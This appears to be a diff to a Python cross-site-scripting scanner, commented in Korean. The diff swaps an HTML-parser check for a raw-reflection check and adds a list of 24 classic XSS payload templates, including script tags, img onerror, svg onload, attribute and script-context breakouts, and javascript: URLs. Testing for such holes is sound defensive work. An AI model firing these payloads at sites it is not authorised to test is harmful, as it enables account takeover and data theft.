@@ -5,14 +5,13 @@
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 이 프레임워크는 HTTP 요청·응답만 봅니다(브라우저를 실행하지 않습니다).
-- 반사형: GET 쿼리에 값을 넣고 응답 본문에서 이벤트 속성 후보를 찾습니다.
+- 반사형: GET 쿼리에 값을 넣고, 응답 HTML 에 원문이 이스케이프 없이 그대로 반사되는지 봅니다.
 - 저장형: 테스트 폼을 1회 제출하고 별도 GET 으로 저장된 표식을 확인합니다.
 - DOM 기반: 페이지와 같은 출처 스크립트를 읽어 '소스→싱크' 패턴을 정적으로 찾습니다.
   실제 실행 여부(진짜 터지는지)는 세 모드 모두 브라우저로 별도 검증이 필요합니다.
 """
 
 import re
-from html.parser import HTMLParser
 from urllib.parse import urljoin, urlsplit, urlunsplit
 
 from dashboard import core, probe
@@ -44,9 +43,10 @@ META = {
              {"value": "stored", "label": "저장형 (POST 폼 1회 + GET 조회)"},
              {"value": "dom", "label": "DOM 기반 (스크립트 소스→싱크 정적 분석)"},
          ]},
-        {"name": "limit", "need": "optional", "type": "int", "default": "100",
+        {"name": "limit", "need": "optional", "type": "int", "default": "124",
          "label": "지점당 테스트 값 수",
-         "help": "반사형 전용. 1~100 사이로 입력합니다. 최대값이면 지점 1개당 그만큼 요청합니다."},
+         "help": "반사형 전용. 1~124 사이. 앞 24개는 고전/탈출 payload(<script>·<img> 등), "
+                 "그 뒤는 자동 발화 조합입니다."},
         {"name": "read_path", "need": "conditional", "when": "저장형 모드(선택 입력)",
          "label": "조회 경로 (비우면 자동)", "default": "",
          "help": "비우면 저장 응답의 Location(새 글 주소)에서 자동으로 찾습니다. "
@@ -149,48 +149,63 @@ def _build_vectors():
 
 VECTORS = _build_vectors()
 
-TEXT_OR_INERT = {
-    "script", "style", "textarea", "title", "template", "noscript",
-    "xmp", "iframe", "noembed", "noframes", "plaintext",
-}
+
+# ─────────── 고전/탈출 payload — 출력이 이스케이프되지 않는 경우를 노린다 ───────────
+# 위 VECTORS 가 '자동 발화 이벤트' 라면, 아래는 가장 기본적인 주입·문맥 탈출 문자열이다.
+# 서버가 특수문자를 그대로 내보내면(이스케이프 안 함) 이 원문이 응답에 그대로 남는다.
+# 형식은 VECTORS 와 같은 (이름, 문맥, 템플릿) — 재사용하는 쪽에서 똑같이 다룬다.
+CLASSIC_VECTORS = (
+    ("script", "HTML 본문", "<script>{H}</script>"),
+    ("script", "대소문자 변형", "<ScRiPt>{H}</ScRiPt>"),
+    ("script", "공백 변형", "<script >{H}</script >"),
+    ("img", "HTML 본문(따옴표 없음)", "<img src=x onerror={H}>"),
+    ("img", "HTML 본문(따옴표)", '<img src="x" onerror="{H}">'),
+    ("svg", "HTML 본문", "<svg onload={H}>"),
+    ("svg", "자가닫힘", "<svg/onload={H}>"),
+    ("body", "HTML 본문", "<body onload={H}>"),
+    ("iframe", "javascript: 스킴", '<iframe src="javascript:{H}"></iframe>'),
+    ("a", "javascript: 스킴", '<a href="javascript:{H}">x</a>'),
+    ("attr", "속성 탈출(겹따옴표)", '"><script>{H}</script>'),
+    ("attr", "속성 탈출(홑따옴표)", "'><script>{H}</script>"),
+    ("attr", "속성 탈출(img)", '"><img src=x onerror={H}>'),
+    ("attr", "속성 내 이벤트 주입", '" onmouseover="{H}" x="'),
+    ("attr", "속성 내 autofocus", '" autofocus onfocus="{H}" x="'),
+    ("script-ctx", "스크립트 문자열 탈출", "';{H};//"),
+    ("script-ctx", "스크립트 블록 탈출", "</script><script>{H}</script>"),
+    ("textarea", "textarea 탈출", "</textarea><script>{H}</script>"),
+    ("title", "title 탈출", "</title><script>{H}</script>"),
+    ("comment", "HTML 주석 탈출", "--><script>{H}</script>"),
+    ("img", "onerror 슬래시 변형", "<img src=x onerror={H}//>"),
+    ("details", "ontoggle", "<details open ontoggle={H}><summary>x</summary></details>"),
+    ("marquee", "onstart", "<marquee onstart={H}>x</marquee>"),
+    ("input", "autofocus onfocus", "<input autofocus onfocus={H}>"),
+)
+
+# 반사형은 고전/탈출 payload 를 먼저, 그다음 자동 발화 조합을 시험한다.
+PAYLOADS = CLASSIC_VECTORS + VECTORS
+VERDICT_BY_RANK = {0: "safe", 1: "potential", 2: "vuln"}
 
 
-class HandlerCandidate(HTMLParser):
-    """원문에서 태그와 이벤트 속성을 찾는 보수적인 검사입니다."""
-
-    def __init__(self, tag, event, handler):
-        super().__init__(convert_charrefs=True)
-        self.expected_tag = tag
-        self.event = event
-        self.handler = handler
-        self.inert = []
-        self.match = None
-
-    def handle_starttag(self, tag, attrs):
-        if not self.inert and tag == self.expected_tag:
-            value = next((value for name, value in attrs if name == self.event), None)
-            if value == self.handler:
-                self.match = self.getpos()
-        if tag in TEXT_OR_INERT and (not self.inert or self.inert[-1] == "template"):
-            self.inert.append(tag)
-
-    def handle_endtag(self, tag):
-        if self.inert and self.inert[-1] == tag and tag != "plaintext":
-            self.inert.pop()
+def _reflect_context(body, i):
+    """반사 위치가 어떤 문맥인지 거칠게 본다."""
+    before = body[:i].lower()
+    if before.rfind("<script") > before.rfind("</script"):
+        return "스크립트 블록"
+    if before.rfind("<") > before.rfind(">"):
+        return "태그 속성"
+    return "HTML 본문"
 
 
-def response_evidence(response, tag, event, handler, marker):
+def response_evidence(response, sent, marker):
+    """반사 판정 → (rank, media_type, detail). 2=취약(원문 그대로), 1=잠재(필터), 0=안전."""
     media_type = (response.header("Content-Type") or "").partition(";")[0].strip().lower()
     if marker not in response.body:
         return 0, media_type, ""
-    if media_type == "text/html" and not 300 <= response.status < 400:
-        parser = HandlerCandidate(tag, event, handler)
-        parser.feed(response.body)
-        parser.close()
-        if parser.match is not None:
-            line, column = parser.match
-            return 2, media_type, f"HTML 이벤트 속성 후보. 응답 {line}행 {column + 1}열."
-    return 1, media_type, "표식 반사. HTML 이벤트 속성 후보로 확인되지 않았습니다."
+    idx = response.body.find(sent)
+    if media_type == "text/html" and idx >= 0 and not 300 <= response.status < 400:
+        return 2, media_type, (f"입력이 {_reflect_context(response.body, idx)} 문맥에 "
+                               "이스케이프 없이 그대로 반사됩니다.")
+    return 1, media_type, "표식은 반사되나 원문이 변형/이스케이프됐습니다(필터 가능)."
 
 
 # ───────────────────────── DOM 기반 (정적 소스→싱크) ─────────────────────────
@@ -418,14 +433,14 @@ def stored_check(target, points, params):
         lines.append("조회 응답이 실패 상태여서 저장형 여부를 판단할 수 없습니다.")
         return Check(point=point, verdict="potential", response=observed, evidence="\n".join(lines))
 
-    rank, media_type, detail = response_evidence(observed, tag, event, handler, marker)
+    rank, media_type, detail = response_evidence(observed, sent, marker)
     if rank:
         lines.append(f"저장된 표식을 조회 응답에서 확인했습니다. {media_type or 'Content-Type 없음'}.")
-        lines.append(detail.replace("표식 반사.", "저장된 표식 확인."))
+        lines.append(detail)
     else:
         lines.append("조회 응답에서 표식을 찾지 못했습니다(저장되지 않았거나 다른 위치일 수 있습니다).")
     lines.append("HTTP 응답 기준입니다. 브라우저 실행 여부는 별도 검증이 필요합니다.")
-    return Check(point=point, verdict="potential" if rank else "safe",
+    return Check(point=point, verdict=VERDICT_BY_RANK[rank],
                  response=observed, evidence="\n".join(lines))
 
 
@@ -437,9 +452,9 @@ def run(target, points, params):
     if mode == "dom":
         return dom_check(target, points, params)
 
-    limit = int(params.get("limit") or len(VECTORS))
-    if not 1 <= limit <= len(VECTORS):
-        raise ValueError("지점당 테스트 값 수는 1~100으로 입력하세요.")
+    limit = int(params.get("limit") or len(PAYLOADS))
+    if not 1 <= limit <= len(PAYLOADS):
+        raise ValueError(f"지점당 테스트 값 수는 1~{len(PAYLOADS)}으로 입력하세요.")
 
     eligible = [
         point for point in points
@@ -453,7 +468,7 @@ def run(target, points, params):
         best_rank, best_response = 0, None
         best_lines = []
         completed = 0
-        for tag, event, template in VECTORS[:limit]:
+        for tag, event, template in PAYLOADS[:limit]:
             marker = probe.marker()
             handler = HANDLER.replace("{T}", marker)
             sent = template.replace("{H}", handler)
@@ -461,16 +476,17 @@ def run(target, points, params):
             completed += 1
             if response.status == 429:
                 results.append(Check(
-                    point=point, verdict="potential", response=best_response or response,
+                    point=point, verdict=VERDICT_BY_RANK[best_rank] if best_rank else "potential",
+                    response=best_response or response,
                     evidence="\n".join([*best_lines, "HTTP 429로 이후 요청을 중단했습니다."]),
                 ))
                 return results
-            rank, media_type, detail = response_evidence(response, tag, event, handler, marker)
+            rank, media_type, detail = response_evidence(response, sent, marker)
             if rank > best_rank:
                 best_rank, best_response = rank, response
                 best_lines = [
                     f"테스트 조합: {tag} / {event}",
-                    f"입력값: {sent}",
+                    f"넣은 입력값: {sent}",
                     f"HTTP {response.status} · {media_type or 'Content-Type 없음'}",
                     detail,
                 ]
@@ -481,7 +497,7 @@ def run(target, points, params):
             "HTTP 응답 기준입니다. 브라우저 실행 여부는 별도 검증이 필요합니다.",
         ]
         results.append(Check(
-            point=point, verdict="potential" if best_rank else "safe",
+            point=point, verdict=VERDICT_BY_RANK[best_rank],
             evidence="\n".join(evidence), response=best_response,
         ))
     return results
